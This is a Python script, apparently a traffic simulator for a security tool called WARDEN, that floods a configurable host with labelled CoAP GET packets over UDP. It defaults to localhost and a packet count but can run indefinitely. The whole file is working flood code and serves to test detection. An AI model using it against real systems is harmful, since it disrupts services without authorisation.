#!/usr/bin/env python3
import argparse
import socket
import time

def build_fake_coap_packet(counter: int) -> bytes:
    # CoAP header:
    # 0x40 = Version 1, Confirmable=0, token length=0
    # 0x01 = GET
    # message id = counter & 0xffff
    message_id = counter & 0xFFFF
    return bytes([
        0x40,
        0x01,
        (message_id >> 8) & 0xFF,
        message_id & 0xFF,
    ]) + f"WARDEN_COAP_ATTACK_{counter}".encode()

def main() -> None:
    parser = argparse.ArgumentParser(description="WARDEN CoAP/UDP flood simulator")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=5683, help="Target CoAP port")
    parser.add_argument("--count", type=int, default=500, help="Number of packets to send")
    parser.add_argument("--delay", type=float, default=0.001, help="Delay between packets in seconds")
    parser.add_argument("--forever", action="store_true", help="Run until Ctrl+C")
    args = parser.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("[WARDEN] CoAP flood")
    print(f"Target: {args.host}:{args.port}")
    print(f"Delay: {args.delay}")
    print("Press Ctrl+C to stop." if args.forever else f"Count: {args.count}")

    sent = 0

    try:
        while args.forever or sent < args.count:
            sent += 1
            sock.sendto(build_fake_coap_packet(sent), (args.host, args.port))

            if sent % 100 == 0:
                print(f"Sent {sent} CoAP packets")

            if args.delay > 0:
                time.sleep(args.delay)

    except KeyboardInterrupt:
        print("\nStopped by user.")
    finally:
        sock.close()
        print(f"[WARDEN] CoAP flood complete. Sent {sent} packets.")

if __name__ == "__main__":
    main()
